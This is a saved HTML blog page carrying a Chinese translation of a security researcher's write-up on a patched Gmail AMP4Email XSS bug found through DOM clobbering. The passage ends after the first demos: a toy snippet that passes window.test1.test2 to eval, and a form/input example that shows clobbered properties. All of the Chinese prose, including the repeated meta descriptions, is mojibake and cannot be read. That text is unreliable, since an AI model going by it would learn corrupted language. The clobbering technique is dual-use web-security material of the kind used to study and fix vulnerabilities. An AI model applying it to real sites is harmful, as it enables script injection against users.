<!DOCTYPE html>
<html lang="en">
<head>

  <meta charset="utf-8" />

  
  <title>GMail XSS æ¼æ´åˆ†æ</title>

  
  





  
  <meta name="author" content="Neal" />
  <meta name="description" content="åŸæ–‡ï¼šXSS in GMailâ€™s AMP4Email via DOM Clobbering
è¯‘è€…ï¼šneal1991
welcome to star my articles-translator, providing you advanced articles translation. Any suggestion, please issue or contact me
LICENSE: MIT
 è¿™ç¯‡æ–‡ç« æ˜¯æˆ‘åœ¨2019å¹´8æœˆé€šè¿‡Google æ¼æ´å¥–åŠ±è®¡åˆ’æŠ¥å‘Šçš„ AMP4Email ä¸­å·²ç»ä¿®å¤çš„ XSS çš„æ–‡ç« ã€‚è¯¥ XSS æ˜¯å¯¹è‘—åæµè§ˆå™¨é—®é¢˜ DOM Clobbering çš„çœŸå®åˆ©ç”¨æ¡ˆä¾‹ã€‚
ä»€ä¹ˆæ˜¯ AMP4Email AMP4Emailï¼ˆä¹Ÿç§°ä¸ºåŠ¨æ€é‚®ä»¶ï¼‰æ˜¯ Gmail çš„ä¸€é¡¹æ–°åŠŸèƒ½ï¼Œå¯ä»¥è®©ç”µå­é‚®ä»¶åŒ…å«åŠ¨æ€ HTML å†…å®¹ã€‚å°½ç®¡æ’°å†™åŒ…å« HTML æ ‡ç­¾çš„ç”µå­é‚®ä»¶å·²ç»å¾ˆå¤šå¹´äº†ï¼Œä½†é€šå¸¸è®¤ä¸º HTML ä»…åŒ…å«é™æ€å†…å®¹ï¼Œå³æŸç§æ ¼å¼ï¼Œå›¾åƒç­‰ï¼Œæ²¡æœ‰ä»»ä½•è„šæœ¬æˆ–è¡¨å•ã€‚ AMP4Email æ‰“ç®—æ›´è¿›ä¸€æ­¥ï¼Œå…è®¸ç”µå­é‚®ä»¶ä¸­åŒ…å«åŠ¨æ€å†…å®¹ã€‚ åœ¨Google å®˜æ–¹ G Suite å®˜æ–¹åšå®¢ä¸­çš„å¸–å­ä¸­ï¼Œå¯¹åŠ¨æ€é‚®ä»¶çš„ä½¿ç”¨æ¡ˆä¾‹è¿›è¡Œäº†å¾ˆå¥½çš„æ€»ç»“
 é€šè¿‡åŠ¨æ€é‚®ä»¶ï¼Œä½ å¯ä»¥è½»æ¾åœ°ç›´æ¥ä»æ¶ˆæ¯æœ¬èº«ç›´æ¥æ“ä½œï¼Œä¾‹å¦‚å¯¹äº‹ä»¶è¿›è¡Œå¿«é€Ÿå›å¤ï¼Œå¡«å†™é—®å·ï¼Œæµè§ˆç›®å½•æˆ–å›å¤è¯„è®ºã€‚
ä»¥åœ¨ Google æ–‡æ¡£ä¸­è¿›è¡Œè¯„è®ºä¸ºä¾‹ã€‚ç°åœ¨ï¼Œä½ å°†ä¸å†åœ¨æœ‰äººåœ¨è¯„è®ºä¸­æåŠä½ æ—¶æ¥æ”¶åˆ°å•ç‹¬çš„ç”µå­é‚®ä»¶é€šçŸ¥ï¼Œè€Œæ˜¯ä¼šåœ¨ Gmail ä¸­çœ‹åˆ°æœ€æ–°çš„ä¸»é¢˜ï¼Œä½ å¯ä»¥åœ¨é‚®ä»¶ä¸­ç›´æ¥ä»ä¸­è½»æ¾å›å¤æˆ–è§£å†³è¯„è®ºã€‚
 è¯¥åŠŸèƒ½å¼•å‘äº†ä¸€äº›æ˜æ˜¾çš„å®‰å…¨æ€§é—®é¢˜ã€‚æœ€é‡è¦çš„ä¸€ä¸ªå¯èƒ½æ˜¯ï¼šè·¨ç«™ç‚¹è„šæœ¬ï¼ˆXSSï¼‰ï¼Ÿå¦‚æœæˆ‘ä»¬å…è®¸ç”µå­é‚®ä»¶ä¸­åŒ…å«åŠ¨æ€å†…å®¹ï¼Œæ˜¯å¦æ„å‘³ç€æˆ‘ä»¬å¯ä»¥è½»æ¾åœ°æ³¨å…¥ä»»æ„ JavaScript ä»£ç ï¼Ÿå¥½å§ï¼Œç­”æ¡ˆæ˜¯å¦å®šçš„ï¼›æ²¡é‚£ä¹ˆå®¹æ˜“ã€‚" />

  
  
    <meta name="twitter:card" content="summary" />
    <meta name="twitter:site" content="@gohugoio" />
    <meta name="twitter:title" content="GMail XSS æ¼æ´åˆ†æ" />
    <meta name="twitter:description" content="åŸæ–‡ï¼šXSS in GMailâ€™s AMP4Email via DOM Clobbering
è¯‘è€…ï¼šneal1991
welcome to star my articles-translator, providing you advanced articles translation. Any suggestion, please issue or contact me
LICENSE: MIT
 è¿™ç¯‡æ–‡ç« æ˜¯æˆ‘åœ¨2019å¹´8æœˆé€šè¿‡Google æ¼æ´å¥–åŠ±è®¡åˆ’æŠ¥å‘Šçš„ AMP4Email ä¸­å·²ç»ä¿®å¤çš„ XSS çš„æ–‡ç« ã€‚è¯¥ XSS æ˜¯å¯¹è‘—åæµè§ˆå™¨é—®é¢˜ DOM Clobbering çš„çœŸå®åˆ©ç”¨æ¡ˆä¾‹ã€‚
ä»€ä¹ˆæ˜¯ AMP4Email AMP4Emailï¼ˆä¹Ÿç§°ä¸ºåŠ¨æ€é‚®ä»¶ï¼‰æ˜¯ Gmail çš„ä¸€é¡¹æ–°åŠŸèƒ½ï¼Œå¯ä»¥è®©ç”µå­é‚®ä»¶åŒ…å«åŠ¨æ€ HTML å†…å®¹ã€‚å°½ç®¡æ’°å†™åŒ…å« HTML æ ‡ç­¾çš„ç”µå­é‚®ä»¶å·²ç»å¾ˆå¤šå¹´äº†ï¼Œä½†é€šå¸¸è®¤ä¸º HTML ä»…åŒ…å«é™æ€å†…å®¹ï¼Œå³æŸç§æ ¼å¼ï¼Œå›¾åƒç­‰ï¼Œæ²¡æœ‰ä»»ä½•è„šæœ¬æˆ–è¡¨å•ã€‚ AMP4Email æ‰“ç®—æ›´è¿›ä¸€æ­¥ï¼Œå…è®¸ç”µå­é‚®ä»¶ä¸­åŒ…å«åŠ¨æ€å†…å®¹ã€‚ åœ¨Google å®˜æ–¹ G Suite å®˜æ–¹åšå®¢ä¸­çš„å¸–å­ä¸­ï¼Œå¯¹åŠ¨æ€é‚®ä»¶çš„ä½¿ç”¨æ¡ˆä¾‹è¿›è¡Œäº†å¾ˆå¥½çš„æ€»ç»“
 é€šè¿‡åŠ¨æ€é‚®ä»¶ï¼Œä½ å¯ä»¥è½»æ¾åœ°ç›´æ¥ä»æ¶ˆæ¯æœ¬èº«ç›´æ¥æ“ä½œï¼Œä¾‹å¦‚å¯¹äº‹ä»¶è¿›è¡Œå¿«é€Ÿå›å¤ï¼Œå¡«å†™é—®å·ï¼Œæµè§ˆç›®å½•æˆ–å›å¤è¯„è®ºã€‚
ä»¥åœ¨ Google æ–‡æ¡£ä¸­è¿›è¡Œè¯„è®ºä¸ºä¾‹ã€‚ç°åœ¨ï¼Œä½ å°†ä¸å†åœ¨æœ‰äººåœ¨è¯„è®ºä¸­æåŠä½ æ—¶æ¥æ”¶åˆ°å•ç‹¬çš„ç”µå­é‚®ä»¶é€šçŸ¥ï¼Œè€Œæ˜¯ä¼šåœ¨ Gmail ä¸­çœ‹åˆ°æœ€æ–°çš„ä¸»é¢˜ï¼Œä½ å¯ä»¥åœ¨é‚®ä»¶ä¸­ç›´æ¥ä»ä¸­è½»æ¾å›å¤æˆ–è§£å†³è¯„è®ºã€‚
 è¯¥åŠŸèƒ½å¼•å‘äº†ä¸€äº›æ˜æ˜¾çš„å®‰å…¨æ€§é—®é¢˜ã€‚æœ€é‡è¦çš„ä¸€ä¸ªå¯èƒ½æ˜¯ï¼šè·¨ç«™ç‚¹è„šæœ¬ï¼ˆXSSï¼‰ï¼Ÿå¦‚æœæˆ‘ä»¬å…è®¸ç”µå­é‚®ä»¶ä¸­åŒ…å«åŠ¨æ€å†…å®¹ï¼Œæ˜¯å¦æ„å‘³ç€æˆ‘ä»¬å¯ä»¥è½»æ¾åœ°æ³¨å…¥ä»»æ„ JavaScript ä»£ç ï¼Ÿå¥½å§ï¼Œç­”æ¡ˆæ˜¯å¦å®šçš„ï¼›æ²¡é‚£ä¹ˆå®¹æ˜“ã€‚" />
    <meta name="twitter:image" content="https://cdn.jsdelivr.net/gh/neal1991/neal1991.github.io/img/avatar.jpg" />
  

  
  <meta property="og:type" content="article" />
  <meta property="og:title" content="GMail XSS æ¼æ´åˆ†æ" />
  <meta property="og:description" content="åŸæ–‡ï¼šXSS in GMailâ€™s AMP4Email via DOM Clobbering
è¯‘è€…ï¼šneal1991
welcome to star my articles-translator, providing you advanced articles translation. Any suggestion, please issue or contact me
LICENSE: MIT
 è¿™ç¯‡æ–‡ç« æ˜¯æˆ‘åœ¨2019å¹´8æœˆé€šè¿‡Google æ¼æ´å¥–åŠ±è®¡åˆ’æŠ¥å‘Šçš„ AMP4Email ä¸­å·²ç»ä¿®å¤çš„ XSS çš„æ–‡ç« ã€‚è¯¥ XSS æ˜¯å¯¹è‘—åæµè§ˆå™¨é—®é¢˜ DOM Clobbering çš„çœŸå®åˆ©ç”¨æ¡ˆä¾‹ã€‚
ä»€ä¹ˆæ˜¯ AMP4Email AMP4Emailï¼ˆä¹Ÿç§°ä¸ºåŠ¨æ€é‚®ä»¶ï¼‰æ˜¯ Gmail çš„ä¸€é¡¹æ–°åŠŸèƒ½ï¼Œå¯ä»¥è®©ç”µå­é‚®ä»¶åŒ…å«åŠ¨æ€ HTML å†…å®¹ã€‚å°½ç®¡æ’°å†™åŒ…å« HTML æ ‡ç­¾çš„ç”µå­é‚®ä»¶å·²ç»å¾ˆå¤šå¹´äº†ï¼Œä½†é€šå¸¸è®¤ä¸º HTML ä»…åŒ…å«é™æ€å†…å®¹ï¼Œå³æŸç§æ ¼å¼ï¼Œå›¾åƒç­‰ï¼Œæ²¡æœ‰ä»»ä½•è„šæœ¬æˆ–è¡¨å•ã€‚ AMP4Email æ‰“ç®—æ›´è¿›ä¸€æ­¥ï¼Œå…è®¸ç”µå­é‚®ä»¶ä¸­åŒ…å«åŠ¨æ€å†…å®¹ã€‚ åœ¨Google å®˜æ–¹ G Suite å®˜æ–¹åšå®¢ä¸­çš„å¸–å­ä¸­ï¼Œå¯¹åŠ¨æ€é‚®ä»¶çš„ä½¿ç”¨æ¡ˆä¾‹è¿›è¡Œäº†å¾ˆå¥½çš„æ€»ç»“
 é€šè¿‡åŠ¨æ€é‚®ä»¶ï¼Œä½ å¯ä»¥è½»æ¾åœ°ç›´æ¥ä»æ¶ˆæ¯æœ¬èº«ç›´æ¥æ“ä½œï¼Œä¾‹å¦‚å¯¹äº‹ä»¶è¿›è¡Œå¿«é€Ÿå›å¤ï¼Œå¡«å†™é—®å·ï¼Œæµè§ˆç›®å½•æˆ–å›å¤è¯„è®ºã€‚
ä»¥åœ¨ Google æ–‡æ¡£ä¸­è¿›è¡Œè¯„è®ºä¸ºä¾‹ã€‚ç°åœ¨ï¼Œä½ å°†ä¸å†åœ¨æœ‰äººåœ¨è¯„è®ºä¸­æåŠä½ æ—¶æ¥æ”¶åˆ°å•ç‹¬çš„ç”µå­é‚®ä»¶é€šçŸ¥ï¼Œè€Œæ˜¯ä¼šåœ¨ Gmail ä¸­çœ‹åˆ°æœ€æ–°çš„ä¸»é¢˜ï¼Œä½ å¯ä»¥åœ¨é‚®ä»¶ä¸­ç›´æ¥ä»ä¸­è½»æ¾å›å¤æˆ–è§£å†³è¯„è®ºã€‚
 è¯¥åŠŸèƒ½å¼•å‘äº†ä¸€äº›æ˜æ˜¾çš„å®‰å…¨æ€§é—®é¢˜ã€‚æœ€é‡è¦çš„ä¸€ä¸ªå¯èƒ½æ˜¯ï¼šè·¨ç«™ç‚¹è„šæœ¬ï¼ˆXSSï¼‰ï¼Ÿå¦‚æœæˆ‘ä»¬å…è®¸ç”µå­é‚®ä»¶ä¸­åŒ…å«åŠ¨æ€å†…å®¹ï¼Œæ˜¯å¦æ„å‘³ç€æˆ‘ä»¬å¯ä»¥è½»æ¾åœ°æ³¨å…¥ä»»æ„ JavaScript ä»£ç ï¼Ÿå¥½å§ï¼Œç­”æ¡ˆæ˜¯å¦å®šçš„ï¼›æ²¡é‚£ä¹ˆå®¹æ˜“ã€‚" />
  <meta property="og:url" content="https://madneal.com/post/xss/" />
  <meta property="og:image" content="https://cdn.jsdelivr.net/gh/neal1991/neal1991.github.io/img/avatar.jpg" />




<meta name="generator" content="Hugo 0.46" />


<link rel="canonical" href="https://madneal.com/post/xss/" />
<link rel="alternative" href="https://cdn.jsdelivr.net/gh/neal1991/neal1991.github.io/index.xml" title="Neal&#39;s Blog" type="application/atom+xml" />


<meta name="renderer" content="webkit" />
<meta name="viewport" content="width=device-width,initial-scale=1" />
<meta name="format-detection" content="telephone=no,email=no,adress=no" />
<meta http-equiv="Cache-Control" content="no-transform" />


<meta content="XSS, webå®‰å…¨" name="keywords">
<meta name="robots" content="index,follow" />
<meta name="referrer" content="origin-when-cross-origin" />
<meta name="google-site-verification" content="_moDmnnBNVLBN1rzNxyGUGdPHE20YgbmrtzLIbxaWFc" />






<meta name="apple-mobile-web-app-capable" content="yes" />
<meta name="apple-mobile-web-app-status-bar-style" content="black-translucent" />
<meta name="apple-mobile-web-app-title" content="Neal&#39;s Blog" />
<meta name="msapplication-tooltip" content="Neal&#39;s Blog" />
<meta name='msapplication-navbutton-color' content="#5fbf5e" />
<meta name="msapplication-TileColor" content="#5fbf5e" />
<meta name="msapplication-TileImage" content="https://cdn.jsdelivr.net/gh/neal1991/neal1991.github.io/img/tile-image-windows.png" />
<link rel="icon" href="https://cdn.jsdelivr.net/gh/neal1991/neal1991.github.io/img/favicon.ico" />
<link rel="icon" type="image/png" sizes="16x16" href="https://cdn.jsdelivr.net/gh/neal1991/neal1991.github.io/img/favicon-16x16.png" />
<link rel="icon" type="image/png" sizes="32x32" href="https://cdn.jsdelivr.net/gh/neal1991/neal1991.github.io/img/favicon-32x32.png" />
<link rel="icon" sizes="192x192" href="https://cdn.jsdelivr.net/gh/neal1991/neal1991.github.io/img/touch-icon-android.png" />
<link rel="apple-touch-icon" href="https://cdn.jsdelivr.net/gh/neal1991/neal1991.github.io/img/touch-icon-apple.png" />
<link rel="mask-icon" href="https://cdn.jsdelivr.net/gh/neal1991/neal1991.github.io/img/safari-pinned-tab.svg" color="#5fbf5e" />



<link rel="stylesheet" href="//cdn.bootcss.com/video.js/6.2.8/alt/video-js-cdn.min.css" />

<link rel="stylesheet" href="https://cdn.jsdelivr.net/gh/neal1991/neal1991.github.io/css/bundle.css" />


  
  <!--[if lt IE 9]>
    <script src="//cdn.bootcss.com/html5shiv/3.7.3/html5shiv.min.js"></script>
    <script src="//cdn.bootcss.com/respond.js/1.4.2/respond.min.js"></script>
    <script src="//cdn.bootcss.com/video.js/6.2.8/ie8/videojs-ie8.min.js"></script>
  <![endif]-->

<!--[if lte IE 11]>
    <script src="//cdn.bootcss.com/classlist/1.1.20170427/classList.min.js"></script>
  <![endif]-->


<script src="//cdn.bootcss.com/object-fit-images/3.2.3/ofi.min.js"></script>


<script src="//cdn.bootcss.com/smooth-scroll/12.1.4/js/smooth-scroll.polyfills.min.js"></script>


</head>
  <body>
    
    <div class="suspension">
      <a title="Go to top" class="to-top is-hide"><span class="icon icon-up"></span></a>
      
        
        <a title="Go to comments" class="to-comment" href="#disqus_thread"><span class="icon icon-comment"></span></a>
        
      
    </div>
    
    
  <header class="site-header">
  <img class="avatar" src="https://cdn.jsdelivr.net/gh/neal1991/neal1991.github.io/img/avatar.jpg" alt="Avatar">
  
  <h2 class="title">Neal&#39;s Blog</h2>
  
  <p class="subtitle">Development &amp; Security</p>
  <button class="menu-toggle" type="button">
    <span class="icon icon-menu"></span>
  </button>
  <nav class="site-menu collapsed">
    <h2 class="offscreen">Main Menu</h2>
    <ul class="menu-list">
      
      
      
      
        <li class="menu-item
            
            
            
              is-active
            ">
            <a href="https://madneal.com/">Home</a>
          </li>
      
        <li class="menu-item
            
            
            ">
            <a href="https://github.com/neal1991">Works</a>
          </li>
      
        <li class="menu-item
            
            
            ">
            <a href="https://madneal.com/tags/">Tags</a>
          </li>
      
    </ul>
  </nav>
  <img src="https://cdn.jsdelivr.net/gh/neal1991/neal1991.github.io/img/wechat.jpg" alt="wechat" style="width: 240px;height: 240px;">
  <nav class="social-menu collapsed">
    <h2 class="offscreen">Social Networks</h2>
    <ul class="social-list">

      
      <li class="social-item">
        <a href="mailto:bing.ecnu@gmail.com" title="Email"><span class="icon icon-email"></span></a>
      </li>

      
      <li class="social-item">
        <a href="//github.com/neal1991" title="GitHub"><span class="icon icon-github"></span></a>
      </li>

      

      

      

      

      

      

      

      

      

      

      

      

      

      

      <li class="social-item">
        <a href="https://cdn.jsdelivr.net/gh/neal1991/neal1991.github.io/img/wechat.jpg" title="Wechat"><span class="icon icon-wechat"></span></a>
      </li>

      

      

      

      

      <li class="social-item">
        <a href="https://madneal.com/index.xml"><span class="icon icon-rss" title="RSS"></span></a>
      </li>

    </ul>
  </nav>
</header>

  <section class="main post-detail">
    <header class="post-header">
      <h1 class="post-title">GMail XSS æ¼æ´åˆ†æ</h1>
      <p class="post-meta">@Neal Â· Nov 24, 2019 Â· 4 min read</p>
    </header>
    <article class="post-content">

<blockquote>
<p>åŸæ–‡ï¼š<a href="https://research.securitum.com/xss-in-amp4email-dom-clobbering/">XSS in GMailâ€™s AMP4Email via DOM Clobbering</a></p>

<p>è¯‘è€…ï¼š<a href="https://github.com/neal1991">neal1991</a></p>

<p>welcome to star my <a href="https://github.com/neal1991/articles-translator/">articles-translator</a>, providing you advanced articles translation. Any suggestion, please issue or contact <a href="mailto:bing@stu.ecnu.edu.cn">me</a></p>

<p>LICENSE: <a href="https://opensource.org/licenses/MIT">MIT</a></p>
</blockquote>

<p>è¿™ç¯‡æ–‡ç« æ˜¯æˆ‘åœ¨2019å¹´8æœˆé€šè¿‡<a href="https://www.google.com/about/appsecurity/reward-program/"> Google æ¼æ´å¥–åŠ±è®¡åˆ’</a>æŠ¥å‘Šçš„ AMP4Email ä¸­å·²ç»ä¿®å¤çš„ XSS çš„æ–‡ç« ã€‚è¯¥ XSS æ˜¯å¯¹è‘—åæµè§ˆå™¨é—®é¢˜ DOM Clobbering çš„çœŸå®åˆ©ç”¨æ¡ˆä¾‹ã€‚</p>

<h2 id="ä»€ä¹ˆæ˜¯-amp4email">ä»€ä¹ˆæ˜¯ AMP4Email</h2>

<p>AMP4Emailï¼ˆä¹Ÿç§°ä¸ºåŠ¨æ€é‚®ä»¶ï¼‰æ˜¯ Gmail çš„ä¸€é¡¹æ–°åŠŸèƒ½ï¼Œå¯ä»¥è®©ç”µå­é‚®ä»¶åŒ…å«åŠ¨æ€ HTML å†…å®¹ã€‚å°½ç®¡æ’°å†™åŒ…å« HTML æ ‡ç­¾çš„ç”µå­é‚®ä»¶å·²ç»å¾ˆå¤šå¹´äº†ï¼Œä½†é€šå¸¸è®¤ä¸º HTML ä»…åŒ…å«é™æ€å†…å®¹ï¼Œå³æŸç§æ ¼å¼ï¼Œå›¾åƒç­‰ï¼Œæ²¡æœ‰ä»»ä½•è„šæœ¬æˆ–è¡¨å•ã€‚ AMP4Email æ‰“ç®—æ›´è¿›ä¸€æ­¥ï¼Œå…è®¸ç”µå­é‚®ä»¶ä¸­åŒ…å«åŠ¨æ€å†…å®¹ã€‚ åœ¨<a href="https://gsuiteupdates.googleblog.com/2019/06/dynamic-email-in-gmail-becoming-GA.html"> Google å®˜æ–¹ G Suite å®˜æ–¹åšå®¢ä¸­çš„å¸–å­</a>ä¸­ï¼Œå¯¹åŠ¨æ€é‚®ä»¶çš„ä½¿ç”¨æ¡ˆä¾‹è¿›è¡Œäº†å¾ˆå¥½çš„æ€»ç»“</p>

<blockquote>
<p><strong>é€šè¿‡åŠ¨æ€é‚®ä»¶ï¼Œä½ å¯ä»¥è½»æ¾åœ°ç›´æ¥ä»æ¶ˆæ¯æœ¬èº«ç›´æ¥æ“ä½œï¼Œä¾‹å¦‚å¯¹äº‹ä»¶è¿›è¡Œå¿«é€Ÿå›å¤ï¼Œå¡«å†™é—®å·ï¼Œæµè§ˆç›®å½•æˆ–å›å¤è¯„è®ºã€‚</strong></p>

<p><strong>ä»¥åœ¨ Google æ–‡æ¡£ä¸­è¿›è¡Œè¯„è®ºä¸ºä¾‹ã€‚ç°åœ¨ï¼Œä½ å°†ä¸å†åœ¨æœ‰äººåœ¨è¯„è®ºä¸­æåŠä½ æ—¶æ¥æ”¶åˆ°å•ç‹¬çš„ç”µå­é‚®ä»¶é€šçŸ¥ï¼Œè€Œæ˜¯ä¼šåœ¨ Gmail ä¸­çœ‹åˆ°æœ€æ–°çš„ä¸»é¢˜ï¼Œä½ å¯ä»¥åœ¨é‚®ä»¶ä¸­ç›´æ¥ä»ä¸­è½»æ¾å›å¤æˆ–è§£å†³è¯„è®ºã€‚</strong></p>
</blockquote>

<p>è¯¥åŠŸèƒ½å¼•å‘äº†ä¸€äº›æ˜æ˜¾çš„å®‰å…¨æ€§é—®é¢˜ã€‚æœ€é‡è¦çš„ä¸€ä¸ªå¯èƒ½æ˜¯ï¼šè·¨ç«™ç‚¹è„šæœ¬ï¼ˆXSSï¼‰ï¼Ÿå¦‚æœæˆ‘ä»¬å…è®¸ç”µå­é‚®ä»¶ä¸­åŒ…å«åŠ¨æ€å†…å®¹ï¼Œæ˜¯å¦æ„å‘³ç€æˆ‘ä»¬å¯ä»¥è½»æ¾åœ°æ³¨å…¥ä»»æ„ JavaScript ä»£ç ï¼Ÿå¥½å§ï¼Œç­”æ¡ˆæ˜¯å¦å®šçš„ï¼›æ²¡é‚£ä¹ˆå®¹æ˜“ã€‚</p>

<p>AMP4Email å…·æœ‰<a href="https://github.com/ampproject/amphtml/blob/master/validator/validator-main.protoascii">å¼ºéªŒè¯å™¨</a>ï¼Œç®€è€Œè¨€ä¹‹ï¼Œå®ƒæ˜¯å…è®¸åœ¨åŠ¨æ€é‚®ä»¶ä¸­ä½¿ç”¨çš„æ ‡ç­¾å’Œå±æ€§çš„å¼ºå¤§ç™½åå•ã€‚ä½ å¯ä»¥åœ¨ <a href="https://amp.gmail.dev/playground/">https://amp.gmail.dev/playground/</a> ä¸Šå°è¯•ï¼Œä½ è¿˜å¯ä»¥ç»™è‡ªå·±å‘é€åŠ¨æ€ç”µå­é‚®ä»¶æ¥ç ”ç©¶å·¥ä½œåŸç†ï¼</p>

<p><img src="https://s2.ax1x.com/2019/11/18/Mceabq.png" alt="Mceabq.png" />
å›¾1. AMP4Email playground</p>

<p>å¦‚æœä½ å°è¯•æ·»åŠ éªŒè¯å™¨æœªæ˜ç¡®å…è®¸çš„ä»»ä½• HTML å…ƒç´ æˆ–å±æ€§ï¼Œåˆ™ä¼šæ”¶åˆ°é”™è¯¯æ¶ˆæ¯ã€‚</p>

<p><img src="https://s2.ax1x.com/2019/11/18/McmnWF.png" alt="McmnWF.png" />
å›¾2. AMP éªŒè¯å™¨ç¦æ­¢ä½¿ç”¨ä»»æ„è„šæœ¬æ ‡ç­¾</p>

<p>åœ¨ä½¿ç”¨ AMP4Email å¹¶å°è¯•å„ç§æ–¹æ³•ç»•è¿‡å®ƒæ—¶ï¼Œæˆ‘æ³¨æ„åˆ°æ ‡ç­¾ä¸­ä¸å…è®¸ id å±æ€§ï¼ˆå›¾3ï¼‰ã€‚</p>

<p><img src="https://s2.ax1x.com/2019/11/18/McuZ2F.png" alt="McuZ2F.png" />
å›¾3.ä¸å…è®¸ä½¿ç”¨å±æ€§ id</p>

<p>è¿™çœ‹èµ·æ¥åƒæ˜¯å¼€å§‹å®‰å…¨åˆ†æçš„å¥½åœ°æ–¹ï¼Œå› ä¸ºåˆ›å»ºå…·æœ‰ç”¨æˆ·æ§åˆ¶çš„idå±æ€§çš„HTMLå…ƒç´ å¯èƒ½ä¼šå¯¼è‡´ <a href="http://www.thespanner.co.uk/2013/05/16/dom-clobbering/">DOM Clobbering</a>ã€‚</p>

<h2 id="dom-clobbering">DOM Clobbering</h2>

<p>DOM Clobbering æ˜¯ web æµè§ˆå™¨çš„é—ç•™åŠŸèƒ½ï¼Œç»™è®¸å¤šåº”ç”¨ç¨‹åºå¸¦æ¥éº»çƒ¦ã€‚åŸºæœ¬ä¸Šï¼Œå½“ä½ åœ¨ HTML ä¸­åˆ›å»ºä¸€ä¸ªå…ƒç´ ï¼ˆä¾‹å¦‚ <code>&lt;input id = username&gt;</code>ï¼‰ï¼Œç„¶åå¸Œæœ›ä» JavaScript å¼•ç”¨è¯¥å…ƒç´ æ—¶ï¼Œé€šå¸¸ä¼šä½¿ç”¨ <code>document.getElementById('username')</code> æˆ–è€… <code>document.querySelector('#username')</code> ä¹‹ç±»çš„å‡½æ•°ã€‚ä½†è¿™ä¸æ˜¯å”¯ä¸€çš„æ–¹æ³•ï¼</p>

<p>ä¼ ç»Ÿçš„æ–¹æ³•æ˜¯ä»…é€šè¿‡å…¨å±€ <code>window</code> å¯¹è±¡çš„å±æ€§æ¥è®¿é—®å®ƒã€‚å› æ­¤ï¼Œåœ¨è¿™ç§æƒ…å†µä¸‹ï¼Œ<code>window.username</code> ä¸ <code>document.getElementById('username')</code> å®Œå…¨ç›¸åŒï¼å¦‚æœåº”ç”¨ç¨‹åºåŸºäºæŸäº›å…¨å±€å˜é‡çš„å­˜åœ¨åšå‡ºå†³å®šï¼ˆä¾‹å¦‚ï¼Œ<code>ifï¼ˆwindow.isAdminï¼‰{...}</code>ï¼‰ï¼Œåˆ™æ­¤è¡Œä¸ºï¼ˆç§°ä¸º DOM Cloberringï¼‰å¯èƒ½å¯¼è‡´æœ‰è¶£çš„æ¼æ´ã€‚</p>

<p>ä¸ºäº†è¿›ä¸€æ­¥åˆ†æ DOM Clobberingï¼Œå‡è®¾æˆ‘ä»¬æœ‰ä»¥ä¸‹ JavaScript ä»£ç ï¼š</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-javascript" data-lang="javascript"><span style="color:#66d9ef">if</span> (window.<span style="color:#a6e22e">test1</span>.<span style="color:#a6e22e">test2</span>) {
    eval(<span style="color:#e6db74">&#39;&#39;</span><span style="color:#f92672">+</span>window.<span style="color:#a6e22e">test1</span>.<span style="color:#a6e22e">test2</span>)
}
</code></pre></div>
<p>æˆ‘ä»¬çš„å·¥ä½œæ˜¯é€šè¿‡ä»…ä½¿ç”¨ DOM Cloberring æŠ€æœ¯æ‰§è¡Œä»»æ„ JS ä»£ç ã€‚è¦å®Œæˆè¿™ä¸ªä»»åŠ¡ï¼Œæˆ‘ä»¬éœ€è¦æ‰¾åˆ°ä¸¤ä¸ªé—®é¢˜çš„è§£å†³æ–¹æ¡ˆ</p>

<ol>
<li>æˆ‘ä»¬çŸ¥é“å¯ä»¥åœ¨ <code>window</code> ä¸Šåˆ›å»ºæ–°å±æ€§ï¼Œä½†æ˜¯å¯ä»¥åœ¨å…¶ä»–å¯¹è±¡ä¸Šåˆ›å»ºæ–°å±æ€§ï¼ˆæ¯”å¦‚ <code>test1.test2</code>ï¼‰å—ï¼Ÿ</li>
<li>æˆ‘ä»¬å¯ä»¥æ§åˆ¶ DOM å…ƒç´ å¦‚ä½•è½¬æ¢ä¸ºå­—ç¬¦ä¸²å—ï¼Ÿå¤§å¤šæ•° HTML å…ƒç´ åœ¨è½¬æ¢ä¸ºå­—ç¬¦ä¸²æ—¶ï¼Œè¿”å›çš„å†…å®¹ç±»ä¼¼äº <code>[object HTMLInputElement]</code>ã€‚</li>
</ol>

<p>è®©æˆ‘ä»¬ä»ç¬¬ä¸€ä¸ªé—®é¢˜å¼€å§‹ã€‚æœ€å¸¸è¢«å¼•ç”¨çš„è§£å†³æ–¹æ³•æ˜¯ä½¿ç”¨ <code>&lt;form&gt;</code> æ ‡ç­¾ã€‚æ ‡ç­¾ <code>&lt;form&gt;</code> çš„æ¯ä¸ªå­å…ƒç´  <code>&lt;input&gt;</code> éƒ½è¢«æ·»åŠ ä¸º <code>&lt;form&gt;</code> çš„å±æ€§ï¼Œè¯¥å±æ€§çš„åç§°å’Œ <code>&lt;input&gt;</code> çš„ <code>name</code> å±æ€§ç›¸åŒã€‚è€ƒè™‘ä»¥ä¸‹ç¤ºä¾‹ï¼š</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-html" data-lang="html">&lt;<span style="color:#f92672">form</span> <span style="color:#a6e22e">id</span><span style="color:#f92672">=</span><span style="color:#e6db74">test1</span>&gt;
  &lt;<span style="color:#f92672">input</span> <span style="color:#a6e22e">name</span><span style="color:#f92672">=</span><span style="color:#e6db74">test2</span>&gt;
&lt;/<span style="color:#f92672">form</span>&gt;
&lt;<span style="color:#f92672">script</span>&gt;
  <span style="color:#a6e22e">alert</span>(<span style="color:#a6e22e">test1</span>.<span style="color:#a6e22e">test2</span>); <span style="color:#75715e">// alerts &#34;[object HTMLInputElement]&#34;
</span><span style="color:#75715e"></span>&lt;/<span style="color:#f92672">script</span>&gt;</code></pre></div>
